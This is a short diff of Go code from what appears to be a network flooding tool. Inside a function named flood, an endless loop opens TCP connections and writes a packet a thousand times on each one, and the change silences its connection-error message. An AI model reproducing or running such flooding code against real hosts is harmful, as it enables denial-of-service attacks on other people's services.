@@ -65,7 +65,7 @@ func flood() {
 	for {
 		s, err = net.Dial("tcp", addr)
 		if err != nil {
-			fmt.Println("Error:", err)
+			// fmt.Println("Error:", err)
 		} else {
 			for i := 0; i < 1000; i++ {
 				s.Write(peket)
